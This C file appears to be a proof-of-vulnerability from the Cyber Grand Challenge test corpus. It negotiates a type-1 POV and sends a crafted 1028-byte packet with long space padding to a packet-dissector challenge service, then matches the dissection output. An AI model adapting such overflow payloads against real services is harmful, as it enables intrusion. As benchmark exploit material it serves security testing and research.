#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb4\x08\xe2\x86"
         "\xcf\xee\x78\x49\xef\xdd\x49\xb1\x10\x01\x00\x00\xb6\xaa\x01\xb0"
         "\x60\x0e\xaa\x96\x8e\xf1\xb9\xac\xe8\xdc\x95\x83\xfb\x76\x06\x4f"
         "\xe7\x7e\xcd\x27\x9a\x21\x8a\x6e\x67\x96\x44\xb1\x90\xfa\xb4\x88"
         "\x23\x45\x5b\xe3\x03\x0c\x5e\xa6\xfc\x6f\x5d\xe3\xad\xad\x9d\xf6"
         "\x82\x38\xfc\x50\xd4\x3a\xee\x16\xa8\xd2\xca\x6f\xb9\xeb\x00\x92"
         "\x31\x59\xbe\x7a\xa4\xcb\x08\x00\x1d\x3f\x6d\x88\xa9\xfb\xa0\xb8"
         "\xfe\xb7\xf8\x62\xd7\x93\x2b\x8e\xae\x39\xf4\x99\x4c\x19\xc5\xbd"
         "\x4b\xb7\xd7\xea\x84\xfd\x69\x8c\x98\x8b\x14\xd3\x23\x7f\x88\xe9"
         "\xe6\x2a\x39\x6d\x36\xfa\x03\x3c\xe9\xca\x06\x81\x87\xd6\xed\x64"
         "\x55\x99\xd4\x73\x97\x16\x15\xef\x49\x38\x66\xc1\x3f\x60\xea\x86"
         "\xa3\x69\xf6\xff\x07\x93\x2d\xcc\xf0\x8c\x59\x49\x3f\xd1\xf4\x79"
         "\x58\xee\x2c\xec\x6c\x67\x1a\x31\x4b\x71\x72\x23\x4c\x6d\x57\x16"
         "\xec\x51\xcb\x95\xb4\xe7\x34\x11\x21\xbc\x7a\x5b\x94\xb9\x10\xd0"
         "\xe9\xf1\xe7\x4a\x71\xda\xd3\xcc\x2f\x7b\x9b\xd2\x28\x38\x95\x2e"
         "\xd8\x67\x50\x00\xeb\xc9\x82\xf3\x06\x74\x7b\x1a\xb2\x7d\xdb\x2b"
         "\x64\x19\xf7\x3e\xbd\xf5\x99\x23\x19\xe8\x04\x3f\x08\x0a\xf2\x77"
         "\x1b\x0c\x02\xf1\xab\x9b\x9f\x9c\xc5\xc4\xec\xdc\x36\xae\xa5\xe0"
         "\x1d\x7b\xe6\xab\x08\xf8\xc1\x33\xf8\x9d\x86\xcb\xed\x37\x07\x91"
         "\xad\x31\x64\x33\xee\xa2\x2d\x3c\x1c\x45\x27\x4c\x85\xe3\x7e\xc3"
         "\xaa\xc9\x05\xe8\x9a\x98\x79\x01\x72\x62\xc5\xc5\x28\x81\x01\xa7"
         "\xec\x8c\xff\x9a\x32\x55\x7a\x07\xc8\x2f\x10\xad\xc1\x40\xbf\xe3"
         "\xb4\xc6\x2c\x26\xd3\xa3\x7d\xb4\x78\xb3\x94\x6e\xb2\xc5\x98\x15"
         "\x32\x93\x66\x1b\xe1\x17\x69\x37\x0f\x34\x81\xe7\xc5\x14\xfc\x6b"
         "\x36\x35\x6e\xf3\x1f\xbd\x80\xcd\xcf\xaa\xc8\x45\xb0\x70\x1e\x7d"
         "\x48\xf4\xd8\xdb\x4f\x18\x6c\x73\x4a\x74\x71\x43\xd1\x3f\x09\x0a"
         "\xb0\x0b\xa4\xa2\xcf\x9f\x8f\xa7\x71\x24\x3e\x5f\x1c\x1f\xe3\x57"
         "\xce\xd6\x5e\xd4\x8e\x00\x49\x83\xa9\xd1\x7f\x80\x66\xce\x1d\xe2"
         "\x02\x1e\x70\x8a\x19\xf4\xa8\xe9\x8b\x71\xe8\xa4\x34\x60\x77\x96"
         "\xef\x9c\xff\x0d\xa0\x9b\x97\x49\x64\x09\xe7\x3a\x92\xf9\x70\xea"
         "\x85\xe9\x48\xe7\x74\xf9\xf0\xab\xee\xfe\x34\xdf\x00\x54\x08\x02"
         "\x5d\xbb\x38\x7c\xf8\x66\x25\xa8\x28\xef\xe4\x1f\x76\x03\x24\xd5"
         "\xe5\x65\x9e\x9d\x7d\x8a\xc0\x4a\xd0\xf3\x10\xe1\xee\xe2\xbf\x48"
         "\x4b\xf3\x69\x9f\xf7\x2e\xc9\x05\xd2\xde\x6f\x58\x39\x6d\xca\x66"
         "\x64\x75\x9b\x28\x9a\x35\xa0\xa0\x45\x6b\x70\x36\x9d\x7a\x35\x5a"
         "\xcb\xb7\xc1\x57\xed\x54\x28\x9b\x67\x40\xb8\x74\x4c\x09\x95\xc3"
         "\x6a\x8d\x19\x9e\x81\x95\x5a\xb9\x12\x0b\x27\x55\xe6\x0f\x90\x81"
         "\xd0\x13\x1a\x66\xc9\x1e\xbe\x41\x5f\xf9\x8a\xc0\xa2\xcc\x39\x5b"
         "\x52\x9c\x2c\x96\x56\x58\xc4\x9e\x03\x56\x7a\x09\x6c\x15\x18\xc2"
         "\x48\xf4\xc3\x84\xc1\x32\x9f\x53\xa1\xe3\x1c\x41\xd1\xeb\x37\xb6"
         "\x3a\x1f\x1c\x00\x1c\xc5\x85\xce\xa0\x06\xc4\xf3\xbd\xc0\xde\x87"
         "\xc3\x7f\xef\xec\x26\x15\x4b\x05\x9a\x57\xfc\x44\x40\x9b\xb9\x2c"
         "\x6f\x8d\x0b\x19\xc9\xa5\x85\x2a\x43\x2a\xc6\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===rosariumpathetism
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x73\x61\x72\x69\x75\x6d\x70\x61\x74"
         "\x68\x65\x74\x69\x73\x6d";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
